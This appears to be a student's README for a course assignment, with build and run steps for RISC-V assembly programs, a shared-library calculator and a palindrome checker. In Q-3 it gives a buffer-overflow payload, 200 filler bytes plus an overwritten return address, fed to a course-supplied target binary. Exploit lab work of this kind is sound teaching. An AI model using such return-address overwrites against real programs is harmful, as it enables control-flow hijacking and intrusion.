[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/d5nOy1eX)


## Q-1 How to run
1. cd to q1
2. Start a docker container
```
docker run -it -v $(pwd):/workspace:Z riscv-dev 
```
3. compile and run
```
riscv64-linux-gnu-gcc -static main.c q1.s -o q1
qemu-riscv64 ./q1
```


## Q-2 
### How to run
1. you have to cd to q2
2. Start a container
   ```
   docker run -it -v $(pwd):/workspace:Z riscv-dev 
   ```
3. compile the program
   ```
   riscv64-linux-gnu-gcc -static q2.s -o q2 
   ```
4. Run the program with input
   eg:
   ```
   qemu-riscv64 ./q2 85 96 70 80 102
   ```

## Q-3 How to run
### part a
```
python3 -c "import struct; import sys; sys.stdout.buffer.write(b'A'*200 + struct.pack('<Q', 0x104e8))" > payload.txt
```
```
./target_shevshev29 < payload.txt
```
#### output expected
```
Sorry, try again.
You have passed!
Segmentation fault (core dumped)
```


### part b
Run the below commands

```
python3 -c "import struct; import sys; sys.stdout.buffer.write(b'A'*200 + struct.pack('<Q', 0x104e8))" > payload
./target_shevshev29 < payload
```

#### output expected
```
Sorry, try again.
You have passed!
Segmentation fault (core dumped)
```

## Q-4 how to run:
1.  you have to cd to q4
2. ```
   gcc -shared -fPIC <op>.c -o lib<op>.so
   gcc q4.c -ldl -o calc
   ./calc
   ```
3. A while loop waits for inputs, to end: hit Ctrl+D to send an EOF


## Q-5 How to run
1. cd into q5
2. create a docker container
docker run -it -v $(pwd):/workspace:Z riscv-dev
3. create an input.txt file and input string by
```
echo "abccba" > input.txt
```

4. run n compile by

```
riscv64-linux-gnu-gcc -static q5.s -o q5
qemu-riscv64 ./q5
```





